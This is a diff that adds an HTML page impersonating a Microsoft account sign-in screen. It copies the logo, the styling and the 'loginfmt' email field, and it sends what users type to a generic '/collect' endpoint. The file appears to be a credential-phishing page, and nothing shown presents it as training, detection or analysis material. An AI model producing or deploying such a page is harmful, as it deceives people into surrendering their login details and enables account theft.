@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Sign in to your account</title>
+<style>
+  body { font-family: "Segoe UI", sans-serif; background: #f2f2f2; margin: 0; }
+  .box { max-width: 440px; margin: 80px auto; background: #fff; padding: 44px; }
+  input { width: 100%; padding: 8px 0; font-size: 15px; border: 0; border-bottom: 1px solid #666; margin: 12px 0; }
+  button { background: #0067b8; color: #fff; border: 0; padding: 6px 30px; }
+</style>
+</head>
+<body>
+<div class="box">
+  <img src="/static/microsoft_logo.svg" alt="Microsoft" width="108" height="24">
+  <h1>Sign in</h1>
+  <form method="POST" action="/collect">
+    <input type="email" name="loginfmt" placeholder="Email, phone, or Skype">
+    <p>No account? Create one!</p>
+    <p>Can't access your account?</p>
+    <button type="submit">Next</button>
+  </form>
+</div>
+</body>
+</html>
